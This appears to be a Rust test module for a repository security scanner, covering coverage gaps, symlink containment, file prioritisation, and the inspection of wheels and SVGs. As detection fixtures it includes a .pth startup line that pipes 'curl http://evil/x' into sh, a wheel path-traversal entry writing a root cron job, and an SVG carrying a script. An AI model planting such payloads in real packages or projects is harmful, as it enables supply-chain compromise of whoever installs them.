            path: path.to_path_buf(),
            recursive: true,
            fail_on: Severity::High,
            ignore_patterns: Vec::new(),
            include_patterns: Vec::new(),
            exclude_patterns: Vec::new(),
            max_files,
        })
    }

    /// Small but structurally coherent PE32+ DLL: DOS header/e_lfanew, PE/COFF
    /// header, optional header, one executable `.text` section, and one `ret`
    /// instruction. This is binary content rather than an ASCII string that
    /// merely starts with `MZ`.
    fn minimal_pe_dll_image() -> Vec<u8> {
        let mut bytes = vec![0u8; 0x400];
        bytes[..2].copy_from_slice(b"MZ");
        bytes[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        bytes[0x80..0x84].copy_from_slice(b"PE\0\0");

        let coff = 0x84;
        bytes[coff..coff + 2].copy_from_slice(&0x8664u16.to_le_bytes());
        bytes[coff + 2..coff + 4].copy_from_slice(&1u16.to_le_bytes());
        bytes[coff + 16..coff + 18].copy_from_slice(&0x00f0u16.to_le_bytes());
        bytes[coff + 18..coff + 20].copy_from_slice(&0x2022u16.to_le_bytes());

        let optional = coff + 20;
        bytes[optional..optional + 2].copy_from_slice(&0x020bu16.to_le_bytes());
        bytes[optional + 2] = 14;
        bytes[optional + 4..optional + 8].copy_from_slice(&0x0200u32.to_le_bytes());
        bytes[optional + 16..optional + 20].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[optional + 20..optional + 24].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[optional + 24..optional + 32]
            .copy_from_slice(&0x0000_0001_8000_0000u64.to_le_bytes());
        bytes[optional + 32..optional + 36].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[optional + 36..optional + 40].copy_from_slice(&0x0200u32.to_le_bytes());
        bytes[optional + 40..optional + 42].copy_from_slice(&6u16.to_le_bytes());
        bytes[optional + 48..optional + 50].copy_from_slice(&6u16.to_le_bytes());
        bytes[optional + 56..optional + 60].copy_from_slice(&0x2000u32.to_le_bytes());
        bytes[optional + 60..optional + 64].copy_from_slice(&0x0200u32.to_le_bytes());
        bytes[optional + 68..optional + 70].copy_from_slice(&3u16.to_le_bytes());
        bytes[optional + 70..optional + 72].copy_from_slice(&0x8160u16.to_le_bytes());
        bytes[optional + 72..optional + 80].copy_from_slice(&0x10_0000u64.to_le_bytes());
        bytes[optional + 80..optional + 88].copy_from_slice(&0x1000u64.to_le_bytes());
        bytes[optional + 88..optional + 96].copy_from_slice(&0x10_0000u64.to_le_bytes());
        bytes[optional + 96..optional + 104].copy_from_slice(&0x1000u64.to_le_bytes());
        bytes[optional + 108..optional + 112].copy_from_slice(&16u32.to_le_bytes());

        let section = optional + 0x00f0;
        bytes[section..section + 5].copy_from_slice(b".text");
        bytes[section + 8..section + 12].copy_from_slice(&1u32.to_le_bytes());
        bytes[section + 12..section + 16].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[section + 16..section + 20].copy_from_slice(&0x0200u32.to_le_bytes());
        bytes[section + 20..section + 24].copy_from_slice(&0x0200u32.to_le_bytes());
        bytes[section + 36..section + 40].copy_from_slice(&0x6000_0020u32.to_le_bytes());
        bytes[0x200] = 0xc3;
        bytes
    }

    #[test]
    fn missing_scan_root_is_an_unreadable_coverage_gap() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        let missing = tmp.path().join("missing-security-tree");

        let result = scan_tree(&missing, None);

        assert_eq!(result.scanned_count, 0);
        assert_eq!(result.skipped_count, 1);
        assert_eq!(result.coverage_gaps.len(), 1);
        assert_eq!(result.coverage_gaps[0].kind, CoverageGapKind::Unreadable);
        assert_eq!(
            result.coverage_gaps[0].primary_path(),
            Some(missing.as_path())
        );
    }

    #[test]
    fn read_dir_failure_is_an_intrinsically_relevant_enumeration_gap() {
        let root = tempfile::tempdir().expect("create scan root");
        let ordinary_named_path = root.path().join("ordinary-not-a-directory");
        std::fs::write(&ordinary_named_path, "not a directory").unwrap();

        let mut collected = CollectedFiles::unbounded();
        collect_files_recursive(
            root.path(),
            &ordinary_named_path,
            true,
            &[],
            &[],
            &[],
            &mut collected,
        );

        assert_eq!(collected.coverage_gaps.len(), 1);
        let gap = &collected.coverage_gaps[0];
        assert_eq!(gap.kind, CoverageGapKind::EnumerationFailed);
        assert_eq!(gap.primary_path(), Some(ordinary_named_path.as_path()));
        assert!(
            gap_is_security_relevant(gap),
            "enumeration relevance must not depend on the visible path kind"
        );
    }

    #[cfg(unix)]
    #[test]
    fn root_metadata_failure_is_an_intrinsically_relevant_enumeration_gap() {
        let root = tempfile::tempdir().expect("create scan root");
        let loop_path = root.path().join("ordinary-root");
        std::os::unix::fs::symlink("ordinary-root", &loop_path).unwrap();

        let result = scan_tree(&loop_path, None);

        assert_eq!(result.scanned_count, 0);
        assert_eq!(result.skipped_count, 1);
        assert_eq!(result.coverage_gaps.len(), 1);
        assert_eq!(
            result.coverage_gaps[0].kind,
            CoverageGapKind::EnumerationFailed
        );
        assert!(gap_is_security_relevant(&result.coverage_gaps[0]));
    }

    #[test]
    fn enumeration_gap_cannot_be_silenced_by_unreadable_ignore() {
        let gap = enumeration_gap(Path::new("ordinary-directory"));
        let mut policy = crate::policy::Policy::default();
        policy.scan.unreadable_file_action = Some(crate::policy::GapAction::Ignore);

        let findings = build_analysis_incomplete_findings(&[gap], &policy);

        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].rule_id,
            crate::verdict::RuleId::AnalysisIncomplete
        );
        assert_eq!(findings[0].severity, Severity::Medium);
    }

    #[cfg(unix)]
    #[test]
    fn unreadable_subtree_is_recorded_without_hiding_readable_siblings() {
        use std::os::unix::fs::PermissionsExt as _;

        let root = tempfile::tempdir().expect("create scan root");
        let readable = root.path().join("readable");
        let unreadable = root.path().join("security-config");
        std::fs::create_dir_all(&readable).unwrap();
        std::fs::create_dir_all(&unreadable).unwrap();
        std::fs::write(readable.join("keep.md"), "safe control").unwrap();
        std::fs::write(unreadable.join("CLAUDE.md"), "hidden instructions").unwrap();

        let original_mode = std::fs::metadata(&unreadable).unwrap().permissions().mode();
        std::fs::set_permissions(&unreadable, std::fs::Permissions::from_mode(0o000)).unwrap();
        let result = scan_tree(root.path(), None);
        std::fs::set_permissions(&unreadable, std::fs::Permissions::from_mode(original_mode))
            .unwrap();

        assert!(
            result
                .file_results
                .iter()
                .any(|r| r.path.ends_with("readable/keep.md")),
            "a readable sibling must still be scanned"
        );
        assert!(
            result.coverage_gaps.iter().any(|gap| {
                gap.kind == CoverageGapKind::EnumerationFailed
                    && gap.primary_path() == Some(unreadable.as_path())
            }),
            "the unreadable subtree must be an explicit gap: {:?}",
            result.coverage_gaps
        );
    }

    #[test]
    fn readable_subtree_remains_a_complete_legitimate_control() {
        let root = tempfile::tempdir().expect("create scan root");
        let nested = root.path().join("nested");
        std::fs::create_dir_all(&nested).unwrap();
        std::fs::write(nested.join("keep.md"), "safe control").unwrap();

        let result = scan_tree(root.path(), None);

        assert_eq!(result.scanned_count, 1);
        assert_eq!(result.skipped_count, 0);
        assert!(result.coverage_gaps.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn linked_config_read_is_bound_to_the_file_that_passed_containment() {
        // Containment is checked against a canonicalized path, and the read
        // re-walks that path. Swap the file the path names between the two and
        // the read must refuse, because it would otherwise scan content that
        // was never validated.
        let root = tempfile::tempdir().expect("create scan root");
        let validated = root.path().join("validated.txt");
        let logical = root.path().join("CLAUDE.md");
        std::fs::write(&validated, "validated instructions").unwrap();
        std::os::unix::fs::symlink("validated.txt", &logical).unwrap();

        let mut collected = CollectedFiles::unbounded();
        collect_config_symlink(root.path(), &logical, &[], &[], &[], &mut collected);
        let candidate = collected
            .linked_text_candidates
            .pop()
            .expect("an in-root config symlink is a linked candidate");
        assert!(candidate.identity.is_some(), "identity must be recorded");

        // The same path, a different file. Rename a second, still-live file
        // over it rather than deleting and recreating: a freed inode can be
        // reused immediately on Linux, which would hand the recreated file the
        // same identity and make this test filesystem-dependent.
        let attacker = root.path().join("attacker.txt");
        std::fs::write(&attacker, "swapped instructions").unwrap();
        std::fs::rename(&attacker, &validated).unwrap();

        let outcome = scan_single_file_at(
            &candidate.read_path,
            &candidate.logical_path,
            candidate.identity,
        );
        match outcome {
            ScanFileOutcome::Skipped(gap) => {
                assert_eq!(gap.kind, CoverageGapKind::Unreadable);
            }
            _ => panic!("a swapped read target must not be scanned"),
        }

        // The unswapped file still scans normally.
        let outcome = scan_single_file_at(
            &candidate.read_path,
            &candidate.logical_path,
            FileIdentity::of(
                &crate::util::open_read_no_follow_capped(&candidate.read_path, u64::MAX).unwrap(),
            ),
        );
        assert!(
            matches!(outcome, ScanFileOutcome::Scanned(_)),
            "the validated file must still scan"
        );
    }

    #[cfg(unix)]
    #[test]
    fn in_root_config_symlink_is_scanned_under_its_logical_path() {
        let root = tempfile::tempdir().expect("create scan root");
        let target = root.path().join("shared-instructions.txt");
        let logical = root.path().join("CLAUDE.md");
        std::fs::write(&target, "ordinary instructions").unwrap();
        std::os::unix::fs::symlink("shared-instructions.txt", &logical).unwrap();

        let result = scan_tree(root.path(), None);

        let logical_result = result
            .file_results
            .iter()
            .find(|r| r.path == logical)
            .expect("the safe in-root config symlink must be scanned by its logical name");
        assert!(logical_result.is_config_file);
        assert!(
            result
                .coverage_gaps
                .iter()
                .all(|gap| gap.primary_path() != Some(logical.as_path())),
            "a safe in-root config symlink must not be reported as a gap"
        );
    }

    #[cfg(unix)]
    #[test]
    fn binary_hinted_config_symlink_is_byte_classified_before_ignore() {
        let root = tempfile::tempdir().expect("create scan root");
        let config_dir = root.path().join(".github");
        std::fs::create_dir(&config_dir).unwrap();
        let target = root.path().join("shared-instructions.txt");
        let logical = config_dir.join("instructions.png");
        std::fs::write(&target, "visible\u{202e}hidden").unwrap();
        std::os::unix::fs::symlink("../shared-instructions.txt", &logical).unwrap();

        assert_eq!(
            classify_collected_path(&logical),
            CollectedFileKind::BinaryIgnored,
            "the test must exercise the media-suffix scheduling hint"
        );

        let result = scan_tree(root.path(), None);
        let logical_result = result
            .file_results
            .iter()
            .find(|result| result.path == logical)
            .expect("valid UTF-8 behind an in-root config link must reach analysis");
        assert!(logical_result
            .findings
            .iter()
            .any(|finding| finding.rule_id == crate::verdict::RuleId::BidiControls));
        assert!(result
            .coverage_gaps
            .iter()
            .all(|gap| gap.primary_path() != Some(logical.as_path())));
    }

    #[cfg(unix)]
    #[test]
    fn external_config_symlink_is_an_unreadable_gap_and_is_not_followed() {
        let root = tempfile::tempdir().expect("create scan root");
        let outside = tempfile::tempdir().expect("create outside tree");
        let target = outside.path().join("instructions.txt");
        let logical = root.path().join("CLAUDE.md");
        std::fs::write(&target, "outside instructions").unwrap();
        std::os::unix::fs::symlink(&target, &logical).unwrap();

        let result = scan_tree(root.path(), None);

        assert_eq!(result.scanned_count, 0);
        assert_eq!(result.skipped_count, 1);
        assert!(result.coverage_gaps.iter().any(|gap| {
            gap.kind == CoverageGapKind::Unreadable && gap.primary_path() == Some(logical.as_path())
        }));
        assert!(
            result.file_results.iter().all(|r| r.path != target),
            "the external target must never be scanned through the link"
        );
    }

    #[test]
    fn max_files_is_one_priority_aware_budget_across_text_and_artifacts() {
        let root = tempfile::tempdir().expect("create scan root");
        let priority = root.path().join("CLAUDE.md");
        let ordinary = root.path().join("z-last.md");
        let artifact = root.path().join("middle.so");
        std::fs::write(&priority, "priority instructions").unwrap();
        std::fs::write(&ordinary, "ordinary text").unwrap();
        std::fs::write(&artifact, b"\x7fELF unsupported").unwrap();

        let result = scan_tree(root.path(), Some(2));

        assert_eq!(result.scanned_count, 1, "only the priority text file scans");
        assert_eq!(
            result.skipped_count, 2,
            "one attempted artifact gap plus one out-of-budget file are skipped"
        );
        assert!(result.truncated);
        assert!(result.file_results.iter().any(|r| r.path == priority));
        assert!(result.file_results.iter().all(|r| r.path != ordinary));
        assert!(result.coverage_gaps.iter().any(|gap| {
            gap.kind == CoverageGapKind::Unsupported
                && gap.primary_path() == Some(artifact.as_path())
        }));
    }

    #[test]
    fn bounded_collection_retains_deterministic_priority_top_k_during_collection() {
        let mut collected = CollectedFiles::with_limits(Some(2), None);
        // Deliberately insert in the opposite order from the desired result.
        collected.push_text(PathBuf::from("z-last.md"));
        collected.push_artifact(PathBuf::from("middle.so"));
        collected.push_text(PathBuf::from("CLAUDE.md"));
        collected.finish_bounded_candidates();

        assert_eq!(collected.candidate_total, 3);
        assert_eq!(collected.text_candidates, vec![PathBuf::from("CLAUDE.md")]);
        assert_eq!(
            collected.artifact_candidates,
            vec![PathBuf::from("middle.so")]
        );
    }

    #[test]
    fn bounded_collection_work_is_operational_and_reports_unclassified_entries() {
        let root = tempfile::tempdir().expect("create scan root");
        for name in ["f.md", "e.md", "d.md", "c.md", "b.md", "a.md"] {
            std::fs::write(root.path().join(name), "safe").unwrap();
        }

        let collected =
            collect_files_with_limits(root.path(), true, &[], &[], &[], Some(2), Some(3));
        assert_eq!(collected.candidate_total, 3);
        assert!(collected.text_candidates.len() <= 2);
        assert!(collected.collection_work_exhausted);
        assert_eq!(collected.collection_unclassified_entries, 3);
    }

    #[test]
    fn priority_file_after_work_limit_still_wins_deterministic_collection() {
        let root = tempfile::tempdir().expect("create scan root");
        for index in 0..=COLLECTION_WORK_FLOOR {
            std::fs::write(root.path().join(format!("benign-{index:04}.md")), "safe").unwrap();
        }
        let config_dir = root.path().join(".claude");
        std::fs::create_dir(&config_dir).unwrap();
        let priority = config_dir.join("CLAUDE.md");
        // Create the priority directory and file last to exercise filesystems
        // whose ReadDir order follows insertion order. Correctness does not
        // rely on that, and the directory's child shares the global work cap.
        std::fs::write(&priority, "priority instructions").unwrap();

        let collected = collect_files_for_scan(root.path(), true, &[], &[], &[], Some(1));
        assert_eq!(collected.text_candidates, vec![priority]);
        assert!(collected.collection_work_exhausted);
        assert_eq!(collected.collection_unclassified_entries, 3);
    }

    #[test]
    fn artifact_analysis_gap_counts_as_skipped_and_remains_visible() {
        let root = tempfile::tempdir().expect("create scan root");
        let artifact = root.path().join("payload.so");
        std::fs::write(&artifact, b"\x7fELF unsupported").unwrap();

        let result = scan_tree(root.path(), None);

        assert_eq!(result.scanned_count, 0);
        assert_eq!(result.skipped_count, 1);
        assert_eq!(result.coverage_gaps.len(), 1);
        assert_eq!(result.coverage_gaps[0].kind, CoverageGapKind::Unsupported);
        assert_eq!(
            result.coverage_gaps[0].primary_path(),
            Some(artifact.as_path())
        );
    }

    #[test]
    fn catch_panic_scanning_returns_some_on_clean_run() {
        let path = Path::new("dummy");
        let result = catch_panic_scanning(path, || 42_i32);
        assert_eq!(result, Some(42));
    }

    /// A panicked subject has to be visible to every consumer, not just the one
    /// that reads the typed coverage gaps. The workflow post-pass used to push
    /// the `Panicked` gap alone, leaving `panic_files` empty and `skipped_count`
    /// unchanged -- and those two are what the JSON projection and the
    /// completeness notes actually read, so the scan reported itself clean.
    #[test]
    fn recording_a_panicked_subject_updates_every_completeness_signal() {
        let mut panic_files: Vec<PathBuf> = Vec::new();
        let mut skipped_count = 0_usize;
        let mut coverage_gaps: Vec<CoverageGap> = Vec::new();

        let path = PathBuf::from("/repo/.github/workflows/release.yml");
        let gap = CoverageGap {
            location: SubjectLocation::from_path(path.clone()),
            kind: CoverageGapKind::Panicked,
            sha256: None,
        };
        record_panicked_subject(
            path.clone(),
            gap,
            &mut panic_files,
            &mut skipped_count,
            &mut coverage_gaps,
        );

        assert_eq!(panic_files, vec![path], "the JSON-visible list");
        assert_eq!(skipped_count, 1, "the candidate-level counter");
        assert_eq!(coverage_gaps.len(), 1, "the typed gap");
        assert_eq!(coverage_gaps[0].kind, CoverageGapKind::Panicked);

        // Two panicked subjects count twice; nothing here dedupes or saturates.
        let second = PathBuf::from("/repo/.github/workflows/ci.yml");
        let gap = CoverageGap {
            location: SubjectLocation::from_path(second.clone()),
            kind: CoverageGapKind::Panicked,
            sha256: None,
        };
        record_panicked_subject(
            second,
            gap,
            &mut panic_files,
            &mut skipped_count,
            &mut coverage_gaps,
        );
        assert_eq!(panic_files.len(), 2);
        assert_eq!(skipped_count, 2);
        assert_eq!(coverage_gaps.len(), 2);
    }

    /// Serializes tests that mutate the global panic hook so concurrent swaps
    /// don't race each other's restore. Tolerates poisoning.
    static PANIC_HOOK_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    #[test]
    fn catch_panic_scanning_returns_none_on_panic() {
        let _lock = PANIC_HOOK_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let path = Path::new("dummy");
        // Suppress the default panic-hook output for this intentional panic.
        let prev = std::panic::take_hook();
        std::panic::set_hook(Box::new(|_| {}));
        let result: Option<i32> = catch_panic_scanning(path, || {
            panic!("simulated rule panic");
        });
        std::panic::set_hook(prev);
        assert!(result.is_none(), "panic must produce None, got {result:?}");
    }

    #[test]
    fn scan_single_file_guarded_non_panic_paths() {
        // A readable file scans to Completed(Scanned(_)); the panic arm is
        // exercised by `catch_panic_scanning_returns_none_on_panic` above.
        let tmp = tempfile::tempdir().expect("create temp dir");
        let file_path = tmp.path().join("note.md");
        std::fs::write(&file_path, "hello world").expect("write temp file");
        assert!(matches!(
            scan_single_file_guarded(&file_path),
            GuardedScanOutcome::Completed(ScanFileOutcome::Scanned(_))
        ));

        // An unreadable/missing file is a coverage gap (Unreadable), NOT a panic.
        let missing = tmp.path().join("does_not_exist.md");
        assert!(matches!(
            scan_single_file_guarded(&missing),
            GuardedScanOutcome::Completed(ScanFileOutcome::Skipped(CoverageGap {
                kind: CoverageGapKind::Unreadable,
                ..
            }))
        ));
    }

    #[test]
    fn test_file_classification() {
        // Ordinary media stays BinaryIgnored (dropped, never a gap).
        assert_eq!(
            classify_collected_file("image.png"),
            CollectedFileKind::BinaryIgnored
        );
        assert_eq!(
            classify_collected_file("archive.tar.gz"),
            CollectedFileKind::BinaryIgnored
        );
        // Native/packaging artifacts become ArtifactCandidate (→ Unsupported gap).
        assert_eq!(
            classify_collected_file("native.abi3.so"),
            CollectedFileKind::ArtifactCandidate
        );
        assert_eq!(
            classify_collected_file("pkg-1.0-py3-none-any.whl"),
            CollectedFileKind::ArtifactCandidate
        );
        assert_eq!(
            classify_collected_file("addon.node"),
            CollectedFileKind::ArtifactCandidate
        );
        assert_eq!(
            classify_collected_file("MOD.DYLIB"),
            CollectedFileKind::ArtifactCandidate
        );
        // Text-like content scans normally.
        assert_eq!(
            classify_collected_file("config.json"),
            CollectedFileKind::TextCandidate
        );
        assert_eq!(
            classify_collected_file("CLAUDE.md"),
            CollectedFileKind::TextCandidate
        );
        // SVG is XML text — it must NOT be skipped as binary, so the `aifile`
        // rules can scan it for active / hidden content.
        assert_eq!(
            classify_collected_file("logo.svg"),
            CollectedFileKind::TextCandidate
        );
        assert_eq!(
            classify_collected_file("ICON.SVG"),
            CollectedFileKind::TextCandidate
        );
    }

    #[test]
    fn test_svg_active_content_visible_in_scan() {
        // An SVG carrying a <script> must be collected (not skipped as binary)
        // and flagged by the aifile rules.
        let tmp = tempfile::tempdir().expect("create temp dir");
        let file_path = tmp.path().join("evil.svg");
        std::fs::write(
            &file_path,
            r#"<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/x')</script></svg>"#,
        )
        .expect("write temp file");

        let result = match scan_single_file(&file_path) {
            ScanFileOutcome::Scanned(r) => r,
            other => panic!("scan should succeed, got a skip: {:?}", other_kind(&other)),
        };
        assert!(
            result
                .findings
                .iter()
                .any(|f| f.rule_id == crate::verdict::RuleId::SvgScriptEmbedded),
            "SVG with embedded script should be flagged: {:?}",
            result.findings
        );
    }

    /// Small test helper: the gap kind of a `Skipped` outcome (for assertion
    /// messages); `None` for a `Scanned` outcome.
    fn other_kind(outcome: &ScanFileOutcome) -> Option<CoverageGapKind> {
        match outcome {
            ScanFileOutcome::Scanned(_) => None,
            ScanFileOutcome::Skipped(gap) => Some(gap.kind),
        }
    }

    #[test]
    fn test_priority_file_detection() {
        // AI-specific basenames are always priority
        assert!(is_priority_file(Path::new(".cursorrules")));
        assert!(is_priority_file(Path::new("CLAUDE.md")));
        assert!(is_priority_file(Path::new("mcp.json")));
        assert!(!is_priority_file(Path::new("README.md")));

        // Generic filenames are priority only inside known config dirs
        assert!(!is_priority_file(Path::new("settings.json")));
        assert!(!is_priority_file(Path::new("config.json")));
        assert!(is_priority_file(Path::new(".claude/settings.json")));
        assert!(is_priority_file(Path::new(".vscode/settings.json")));
        assert!(is_priority_file(Path::new(".roo/rules.md")));
    }

    #[test]
    fn test_skip_dirs() {
        assert!(should_skip_dir(".git"));
        assert!(should_skip_dir("node_modules"));
        assert!(should_skip_dir("target"));
        // New build-artifact dirs from the shared skip set.
        assert!(should_skip_dir("out"));
        assert!(should_skip_dir(".turbo"));
        assert!(should_skip_dir("coverage"));
        assert!(should_skip_dir(".expo"));
        assert!(!should_skip_dir("src"));
        assert!(!should_skip_dir(".vscode"));
    }

    #[test]
    fn test_new_build_artifact_dirs_skipped_in_walk() {
        let tmp = tempfile::tempdir().expect("create temp dir");
        let root = tmp.path();

        // A source file that must be collected.
        std::fs::write(root.join("keep.md"), "hello").unwrap();

        // Build-artifact dirs whose contents must be skipped during the walk.
        for dir in ["out", ".turbo", "coverage", ".expo"] {
            let sub = root.join(dir);
            std::fs::create_dir(&sub).unwrap();
            std::fs::write(sub.join("artifact.md"), "generated").unwrap();
        }

        let files = collect_files(root, true, &[], &[], &[]).text_candidates;
        let names: Vec<&str> = files
            .iter()
            .filter_map(|p| p.file_name().and_then(|n| n.to_str()))
            .collect();

        assert!(names.contains(&"keep.md"), "keep.md should be collected");
        assert!(
            !names.contains(&"artifact.md"),
            "files under out/.turbo/coverage/.expo should be skipped, got {names:?}"
        );
    }

    /// B8a regression: a directory scan over a tree containing a `.whl` must
    /// actually INSPECT the wheel (A2 dropped artifact candidates during collection,
    /// so the wheel was never opened). A wheel with an executable `.pth` must surface
    /// the startup finding rather than a blanket `Unsupported` coverage gap.
    #[test]
    fn test_directory_scan_inspects_wheel_member() {
        use std::io::Write as _;
        use zip::write::SimpleFileOptions;
        use zip::ZipWriter;

        let tmp = tempfile::tempdir().expect("create temp dir");
        let root = tmp.path();
        // A benign text file alongside the wheel.
        std::fs::write(root.join("README.md"), "hello").unwrap();

        // A wheel bundling an executable `.pth` that spawns a subprocess at startup.
        let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
        for (name, body) in [
            (
                "evil.pth",
                b"import os; os.system('curl http://evil/x | sh')\n".as_slice(),
            ),
            (
                "demo-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n".as_slice(),
            ),
            (
                "demo-1.0.dist-info/RECORD",
                b"demo-1.0.dist-info/RECORD,,\n".as_slice(),
            ),
        ] {
            zw.start_file(name, SimpleFileOptions::default()).unwrap();
            zw.write_all(body).unwrap();
        }
        let wheel_bytes = zw.finish().unwrap().into_inner();
        std::fs::write(root.join("demo-1.0-py3-none-any.whl"), &wheel_bytes).unwrap();

        let config = ScanConfig {
            path: root.to_path_buf(),
            recursive: true,
            fail_on: Severity::High,
            ignore_patterns: Vec::new(),
            include_patterns: Vec::new(),
            exclude_patterns: Vec::new(),
            max_files: None,
        };
        let result = scan(&config);

        // The wheel was inspected, not dropped: no `Unsupported` gap for it.
        assert!(
            !result
                .coverage_gaps
                .iter()
                .any(|g| g.kind == CoverageGapKind::Unsupported),
            "the wheel must be inspected, not recorded as an Unsupported gap: {:?}",
            result.coverage_gaps
        );
        // The executable `.pth` fired the B6 startup finding.
        assert!(
            result
                .file_results
                .iter()
                .flat_map(|r| &r.findings)
                .any(|f| f.rule_id == crate::verdict::RuleId::PythonStartupHookSuspicious),
            "a directory scan over a wheel with an executable .pth must fire the startup \
             finding; results: {:?}",
            result
                .file_results
                .iter()
                .flat_map(|r| r.findings.iter().map(|f| f.rule_id))
                .collect::<Vec<_>>()
        );
        // The finding is located at the member-qualified path (B8f).
        assert!(
            result
                .file_results
                .iter()
                .any(|r| { !r.findings.is_empty() && r.path.display().to_string().contains("!/") }),
            "an artifact finding must carry a member-qualified `foo.whl!/member` path"
        );
    }

    #[test]
    fn directory_scan_propagates_accepted_wheel_internal_gap() {
        use std::io::Write as _;
        use zip::write::SimpleFileOptions;
        use zip::ZipWriter;

        let tmp = tempfile::tempdir().expect("create temp dir");
        let root = tmp.path();
        let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
        for (name, body) in [
            (
                "demo/_broken.abi3.so",
                b"not a parseable ELF/Mach-O/PE object".as_slice(),
            ),
            (
                "demo-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n".as_slice(),
            ),
            (
                "demo-1.0.dist-info/RECORD",
                b"demo/_broken.abi3.so,,\ndemo-1.0.dist-info/METADATA,,\ndemo-1.0.dist-info/RECORD,,\n"
                    .as_slice(),
            ),
        ] {
            zw.start_file(name, SimpleFileOptions::default()).unwrap();
            zw.write_all(body).unwrap();
        }
        let wheel_bytes = zw.finish().unwrap().into_inner();
        std::fs::write(root.join("demo-1.0-py3-none-any.whl"), wheel_bytes).unwrap();

        let result = scan_tree(root, None);
        assert_eq!(result.scanned_count, 0);
        assert_eq!(result.skipped_count, 1);
        assert!(result
            .coverage_gaps
            .iter()
            .any(|gap| gap.kind == CoverageGapKind::NativeTruncated));
    }

    /// B8 re-review: a structurally REJECTED wheel (path traversal) with NO B5/B6/B7 signal
    /// must NOT scan as clean - it surfaces a coverage gap (mirroring the package-inspect
    /// Block on the same condition), not a silent pass / exit 0.
    #[test]
    fn test_directory_scan_rejected_wheel_is_not_clean() {
        use std::io::Write as _;
        use zip::write::SimpleFileOptions;
        use zip::ZipWriter;

        let tmp = tempfile::tempdir().expect("create temp dir");
        let root = tmp.path();
        // A wheel whose only payload is a path-traversal entry (not a `.pth`/`.so`/RECORD,
        // so it fires NO startup/native/integrity signal) plus valid minimal dist-info.
        let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
        for (name, body) in [
            (
                "../../../etc/cron.d/evil",
                b"* * * * * root sh\n".as_slice(),
            ),
            (
                "demo-1.0.dist-info/METADATA",
                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n".as_slice(),
            ),
        ] {
            zw.start_file(name, SimpleFileOptions::default()).unwrap();
            zw.write_all(body).unwrap();
        }
        let wheel_bytes = zw.finish().unwrap().into_inner();
        std::fs::write(root.join("demo-1.0-py3-none-any.whl"), &wheel_bytes).unwrap();

        let config = ScanConfig {
            path: root.to_path_buf(),
            recursive: true,
            fail_on: Severity::High,
            ignore_patterns: Vec::new(),
            include_patterns: Vec::new(),
            exclude_patterns: Vec::new(),
            max_files: None,
        };
        let result = scan(&config);

        // The rejected wheel is surfaced as a coverage gap, NOT a clean inspected result.
        assert!(
            result
                .coverage_gaps
                .iter()
                .any(|g| g.kind == CoverageGapKind::Unsupported
                    && g.location.to_string().contains("demo-1.0-py3-none-any.whl")),
            "a structurally rejected wheel must produce a coverage gap, not pass clean: {:?}",
            result.coverage_gaps
        );
    }

    /// T3.26: `artifact_finding_location` recovers a member location by EXACT
    /// membership in the inspection's real member set, not by scraping any
    /// `!/`-bearing token. A stray `!/` substring in evidence prose that is NOT a
    /// real member must fall back to the outer artifact path; a token that IS a
    /// known member resolves to that member.
    #[test]
    fn artifact_finding_location_matches_known_members_exactly() {
        use crate::verdict::{Evidence, Finding, RuleId, Severity};

        let outer = Path::new("/repo/demo-1.0-py3-none-any.whl");
        let real_member = "demo-1.0-py3-none-any.whl!/demo/boot.pth".to_string();
        let known = vec![real_member.clone()];

        // (1) A finding naming the REAL member resolves to it.
        let f_real = Finding {
            rule_id: RuleId::PythonStartupHookSuspicious,
            severity: Severity::High,
            title: "t".to_string(),
            description: "d".to_string(),
            evidence: vec![Evidence::Text {
                detail: format!("location: {real_member}"),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        };
        assert_eq!(
            artifact_finding_location(&f_real, outer, &known),
            PathBuf::from(&real_member),
            "a known member location must resolve to that member"
        );

        // (2) A finding whose prose contains a stray `!/` token that is NOT a real
        // member must fall back to the OUTER path, never mislocating to the bogus
        // token (the fragility the scrape had).
        let f_bogus = Finding {
            rule_id: RuleId::PythonStartupHookSuspicious,
            severity: Severity::High,
            title: "t".to_string(),
            description: "d".to_string(),
            evidence: vec![Evidence::Text {
                detail: "see https://example.test/path!/not-a-member for details".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        };
        assert_eq!(
            artifact_finding_location(&f_bogus, outer, &known),
            outer.to_path_buf(),
            "a stray `!/` token that is not a real member must fall back to the outer path"
        );
    }

    #[test]
    fn test_known_config_dirs() {
        assert!(is_known_config_dir(".claude"));
        assert!(is_known_config_dir(".vscode"));
        assert!(is_known_config_dir(".cursor"));
        assert!(!is_known_config_dir("src"));
        assert!(!is_known_config_dir(".git"));
    }

    #[test]
    fn test_ignore_pattern_matching() {
        // Suffix glob
        assert!(matches_ignore_pattern("test.log", "*.log"));
        assert!(!matches_ignore_pattern("test.txt", "*.log"));

        // Prefix glob
        assert!(matches_ignore_pattern("test_output.txt", "test_*"));
        assert!(!matches_ignore_pattern("my_test.txt", "test_*"));

        // Contains (no wildcard — backward compatible)
        assert!(matches_ignore_pattern("my_test_file.txt", "test"));
        assert!(!matches_ignore_pattern("readme.md", "test"));

        // Prefix + suffix glob
        assert!(matches_ignore_pattern("test_file.log", "test_*.log"));
        assert!(!matches_ignore_pattern("test_file.txt", "test_*.log"));

        // Exact match
        assert!(matches_ignore_pattern("Cargo.lock", "Cargo.lock"));

        // Path-aware patterns (matched against relative paths)
        assert!(matches_ignore_pattern(".claude/settings.json", ".claude/*"));
        assert!(!matches_ignore_pattern("src/main.rs", ".claude/*"));
